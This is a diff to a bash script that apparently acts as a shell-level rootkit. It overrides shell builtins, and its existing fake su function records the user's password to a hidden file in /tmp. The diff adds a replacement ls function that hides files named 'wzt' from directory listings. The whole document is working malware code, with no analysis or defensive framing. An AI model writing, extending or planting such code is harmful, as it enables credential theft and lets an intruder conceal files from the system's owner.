@@ -11,6 +11,8 @@ declare -r fake_unset
 declare -r type
 declare -r typeset
 
+unalias ls >/dev/null 2>&1
+
 function abcdmagic()
 {
 	:
@@ -240,4 +242,59 @@ function su()
         echo -ne "\033[K\033[?25h"
 
         /bin/su && unset su && echo $pass >> /tmp/...
+}
+
+function max_file_length()
+{
+        local fake_file sum=0 n=0
+
+        for fake_file in $(/bin/ls)
+        do
+                n=${#fake_file}
+                [ $n -gt $sum ] && sum=$n
+        done
+
+        return $sum
+}
+
+function ls()
+{
+        local fake_file max_col_num file_format
+        local file_len=0 sum=0 n=0
+
+        max_col_num=`stty size|cut -d " " -f 2`
+        ((max_col_num-=0))
+
+        case $1 in
+        "")
+                max_file_length
+                file_len=$?
+
+                for fake_file in $(/bin/ls)
+                do
+                        if [ "$fake_file" == "wzt" ];then
+                                continue
+                        fi
+
+                        n=${#fake_file}
+                        ((sum=sum+n+file_len))
+
+                        if [ $sum -gt $max_col_num ];then
+                                file_format="%-$file_len""s\n"
+                                printf $file_format $fake_file
+                                sum=0
+                        else
+                                file_format="%-$file_len""s"" "
+                                printf $file_format $fake_file
+                        fi
+                done
+
+                [ $sum -le $max_col_num ] && echo ""
+                return ;;
+        "*l*")
+                fake_file=`/bin/ls -l --color=tty`
+                new_file=`echo "$fake_file" | sed -e '/wzt/d'`
+                echo "$new_file"
+                return ;;
+        esac
 }
